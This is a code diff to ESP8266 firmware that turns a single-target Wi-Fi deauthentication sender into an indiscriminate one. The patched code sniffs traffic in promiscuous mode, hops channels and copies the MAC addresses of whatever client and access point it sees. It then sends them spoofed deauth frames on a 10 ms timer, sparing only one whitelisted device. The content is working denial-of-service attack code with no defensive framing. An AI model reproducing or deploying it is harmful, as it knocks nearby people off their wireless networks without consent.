@@ -13,14 +13,14 @@ os_event_t    user_procTaskQueue[user_procTaskQueueLen];
 static volatile os_timer_t deauth_timer;
 
 // Channel to perform deauth
-uint8_t channel = 1;
+uint8_t channel = 11;
 
 // Access point MAC to deauth
 uint8_t ap[6] = {0x00,0x01,0x02,0x03,0x04,0x05};
 
 // Client MAC to deauth
 uint8_t client[6] = {0x06,0x07,0x08,0x09,0x0A,0x0B};
-
+uint8_t ignore_client[6] = {0x60, 0xf8, 0x1d,0xb4,0x87,0xbe};
 // Sequence number of a packet from AP to client
 uint16_t seq_n = 0;
 
@@ -110,16 +110,37 @@ uint16_t deauth_packet(uint8_t *buf, uint8_t *client, uint8_t *ap, uint16_t seq)
     buf[25] = 0;
     return 26;
 }
-
+uint32_t sending = 0, counter = 0, has_client = 0;
 /* Sends deauth packets. */
 void deauth(void *arg)
 {
+    counter ++;
+    if(counter  >= 499) {
+        counter = 0;
+        channel ++;
+        channel &= 0x0F;
+        wifi_set_channel(channel);
+        os_printf("Channel: %d\r\n", channel);
+        has_client = 0;
+    } else if(counter > 49 && has_client == 0) {
+        os_printf("Next channel: %d\r\n", channel);
+        counter = 499;
+    } 
+    if(sending == 0) return;
     os_printf("\nSending deauth seq_n = %d ...\n", seq_n/0x10);
     // Sequence number is increased by 16, see 802.11
     uint16_t size = deauth_packet(packet_buffer, client, ap, seq_n+0x10);
     wifi_send_pkt_freedom(packet_buffer, size, 0);
+    sending = 0;
 }
-
+void dummy(uint8_t *buf, uint8_t len) 
+{
+    uint8_t i;
+    for(i=0; i<len; i++) {
+        os_printf("%02X ", buf[i]);
+    }
+    os_printf("\r\n");
+}
 /* Listens communication between AP and client */
 static void ICACHE_FLASH_ATTR
 promisc_cb(uint8_t *buf, uint16_t len)
@@ -132,10 +153,25 @@ promisc_cb(uint8_t *buf, uint16_t len)
         struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
         int i=0;
         // Check MACs
-        for (i=0; i<6; i++) if (sniffer->buf[i+4] != client[i]) return;
-        for (i=0; i<6; i++) if (sniffer->buf[i+10] != ap[i]) return;
+        if(sending) return;
+        has_client = 1;
+        int cmp = 0;
+        for (i=0; i<6; i++) if (sniffer->buf[i+4] == ignore_client[i]){cmp++;}
+        if(cmp>=5) {
+            os_printf("ignore_client\r\n");
+            return;
+        }   
+        for (i=0; i<6; i++) client[i] = sniffer->buf[i+4]; //if (sniffer->buf[i+4] != client[i]) return;
+        for (i=0; i<6; i++) ap[i] = sniffer->buf[i+10];////if (sniffer->buf[i+10] != ap[i]) return;
+
+        sending = 1;
         // Update sequence number
         seq_n = sniffer->buf[23] * 0xFF + sniffer->buf[22];
+        os_printf("seq: %d:\r\n", seq_n);
+        
+        // dummy(client, 6);
+        // dummy(ap, 6);
+        //deauth(NULL);
     }
 }
 
@@ -143,7 +179,7 @@ void ICACHE_FLASH_ATTR
 sniffer_system_init_done(void)
 {
     // Set up promiscuous callback
-    wifi_set_channel(1);
+    wifi_set_channel(channel);
     wifi_promiscuous_enable(0);
     wifi_set_promiscuous_rx_cb(promisc_cb);
     wifi_promiscuous_enable(1);
@@ -161,7 +197,7 @@ user_init()
     // Set timer for deauth
     os_timer_disarm(&deauth_timer);
     os_timer_setfn(&deauth_timer, (os_timer_func_t *) deauth, NULL);
-    os_timer_arm(&deauth_timer, CHANNEL_HOP_INTERVAL, 1);
+    os_timer_arm(&deauth_timer, 10, 1);
     
     // Continue to 'sniffer_system_init_done'
     system_init_done_cb(sniffer_system_init_done);
